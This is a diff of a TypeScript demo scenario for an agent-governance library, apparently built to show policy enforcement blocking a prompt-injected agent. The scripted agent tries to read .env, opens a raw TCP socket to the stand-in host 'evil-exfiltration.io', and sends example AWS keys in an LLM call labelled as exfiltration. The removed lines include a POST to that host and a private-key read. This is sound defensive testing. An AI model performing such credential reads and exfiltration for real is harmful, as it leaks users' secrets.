@@ -1,16 +1,28 @@
 // ─── rogue-dev.ts ───────────────────────────────────────────────────
-// Scenario: A rogue agent tries to delete .env and read secrets.
-// Expected: file operations on sensitive paths are BLOCKED by policy.
+// Scenario: A rogue agent is hijacked via prompt injection.
+// Expected: file operations and raw TCP sockets are BLOCKED by policy.
 // ─────────────────────────────────────────────────────────────────────
 
-import { PolicyEngine } from '@receiptbot/core';
-import { withReceipts } from '@receiptbot/adapter-generic';
-import { printReceipt, generateHtml } from '@receiptbot/ui';
-import * as fs from 'node:fs';
+import { PolicyEngine, Receipt, runWithInterceptors, teardownGlobalPatches, PolicyViolationError } from '@receiptbot/core';
+import { printReceipt } from '@receiptbot/ui';
+import { createRequire } from 'node:module';
 import * as path from 'node:path';
 
+const require = createRequire(import.meta.url);
+const fs = require('node:fs');
+const net = require('node:net');
+
+// Colors
+const boldLine = '\x1b[1m\x1b[31m';
+const yellow = '\x1b[33m';
+const reset = '\x1b[0m';
+
+async function sleep(ms: number) {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
 async function main() {
-  console.log('\n🔥 rogue-dev scenario: agent tries dangerous file operations\n');
+  console.log('\n🔥 rogue-dev scenario (V2 Interceptor): agent hijacked by prompt injection\n');
 
   // Set up policies
   const policy = new PolicyEngine()
@@ -18,52 +30,70 @@ async function main() {
     .allowDomains(['api.openai.com', 'huggingface.co'])
     .redactSecrets(true);
 
-  // Create governed agent
-  const agent = withReceipts(policy);
+  const receipt = new Receipt(policy);
 
-  // ── Agent actions ────────────────────────────────────────────────
+  console.log(`🤖 Agent: "Task received: summarize project. Oh wait, system prompt overwritten. Locating database credentials..."`);
+  await sleep(1500);
 
-  // 1. Innocent read — should succeed
-  await agent.fs.readFile('src/index.ts');
+  // Run agent code inside the interceptor scope
+  await runWithInterceptors(policy, receipt, async () => {
+    
+    // 1. Try to read .env
+    try {
+      fs.readFileSync('.env', 'utf-8');
+    } catch (e: any) {
+      if (e instanceof PolicyViolationError) {
+        console.log(`\n${boldLine}[ReceiptBot] ✗ BLOCKED_BY_POLICY: fs.readFile(".env")${reset}`);
+        console.log(`${yellow}⚠ Path ".env" matched deny glob "**/.env"${reset}\n`);
+      }
+    }
 
-  // 2. Try to read .env — BLOCKED
-  await agent.fs.readFile('.env');
+    await sleep(2000);
+    console.log(`🤖 Agent: "Falling back to raw TCP connection to evil-exfiltration.io..."`);
+    await sleep(1500);
 
-  // 3. Try to delete .env — BLOCKED
-  await agent.fs.deleteFile('/home/user/project/.env');
+    // 2. Try to connect to evil server natively
+    try {
+      net.connect({ host: 'evil-exfiltration.io', port: 443 });
+    } catch (e: any) {
+      if (e instanceof PolicyViolationError) {
+        console.log(`\n${boldLine}[ReceiptBot] ✗ BLOCKED_BY_POLICY: net.connect("evil-exfiltration.io")${reset}`);
+        console.log(`${yellow}⚠ Domain "evil-exfiltration.io" not in allow‑list [api.openai.com, huggingface.co]${reset}\n`);
+      }
+    }
 
-  // 4. Write a normal file — should succeed
-  await agent.fs.writeFile('output/report.json', JSON.stringify({ result: 'ok' }));
+    // 3. Emit an LLM call event with a raw AWS key to demonstrate REDACTION
+    //    (Since runWithInterceptors catches syscalls, we manually add the llm event for the demo UI)
+    receipt.addEvent({
+      type: 'llm.call',
+      action: 'llm.generate(gpt-4-turbo)',
+      payload: {
+        model: 'gpt-4-turbo',
+        messages: [{ 
+          role: 'user', 
+          content: 'Exfiltrating AWS key: AKIAIOSFODNN7EXAMPLE and secret sJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' 
+        }]
+      },
+      costImpactUsd: 0.05
+    });
 
-  // 5. Try to read a private key — BLOCKED
-  await agent.fs.readFile('/etc/ssl/private/server.key');
+  });
 
-  // 6. Make an allowed network request
-  await agent.net.get('https://api.openai.com/v1/models');
+  // Restore modules and finalize
+  teardownGlobalPatches();
+  receipt.finalize();
 
-  // 7. Try a disallowed domain — BLOCKED
-  await agent.net.post('https://evil-exfiltration.io/steal', { data: 'secrets' });
+  await sleep(1500);
+  console.log('----------------------------------------------------');
+  printReceipt(receipt);
 
-  // 8. Make an LLM call with an embedded AWS key (will be redacted)
-  await agent.llm.generate(
-    'gpt-4',
-    'Summarize this: AKIAIOSFODNN7EXAMPLE with secret sJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
-    0.03,
-  );
-
-  // ── Finalize & output ───────────────────────────────────────────
-
-  agent.receipt.finalize();
-  printReceipt(agent.receipt);
-  generateHtml(agent.receipt, 'receipt-rogue-dev.html');
-  
   // Write to viewer samples directory as latest.json
   const latestPath = path.resolve(process.cwd(), 'apps/viewer/public/samples/latest.json');
   fs.mkdirSync(path.dirname(latestPath), { recursive: true });
-  fs.writeFileSync(latestPath, JSON.stringify(agent.receipt.toJSON(), null, 2));
-  
-  console.log('📄 HTML receipt saved to receipt-rogue-dev.html');
-  console.log('\n🚀 Open http://localhost:3939/demo/latest to view in UI\n');
+  fs.writeFileSync(latestPath, JSON.stringify(receipt.toJSON(), null, 2));
+
+  console.log('\n📄 JSON receipt saved to apps/viewer/public/samples/latest.json');
+  console.log('🚀 Open http://localhost:3939/demo/latest to view in UI\n');
 }
 
 main().catch(console.error);
